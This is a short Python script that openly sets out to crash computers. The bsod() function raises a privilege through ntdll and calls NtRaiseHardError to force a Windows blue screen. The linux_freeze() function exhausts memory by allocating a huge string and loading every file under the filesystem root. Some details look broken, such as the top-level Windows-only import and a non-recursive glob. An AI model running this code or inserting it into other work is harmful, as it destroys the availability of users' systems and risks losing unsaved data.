import glob
from ctypes import POINTER, byref, c_bool, c_int, c_uint, c_ulong
from ctypes import windll

import numpy as np

"""
Generate a BSOD on Windows.
Freeze a linux machine.
"""


def bsod():
    nullptr = POINTER(c_int)()
    windll.ntdll.RtlAdjustPrivilege(c_uint(19), c_uint(1), c_uint(0), byref(c_int()))
    windll.ntdll.NtRaiseHardError(c_ulong(0xC000007B), c_ulong(0), nullptr, nullptr, c_uint(6), byref(c_uint()))
    ntdll = windll.ntdll
    prev_value = c_bool()
    res = c_ulong()
    ntdll.RtlAdjustPrivilege(19, True, False, byref(prev_value))
    if not ntdll.NtRaiseHardError(0xDEADDEAD, 0, 0, 0, 6, byref(res)):
        return True
    else:
        return False


def linux_freeze():
    eat_ram = ' ' * 25000000000
    dataset = []
    # Start at the filesystem root and read every file into an array
    # which will hopefully crash the computer.
    for file in glob.glob('/**/*'):
        dataset.append(
            np.fromfile(file, dtype='uint8')
        )
    dataset_np = np.concatenate(dataset)
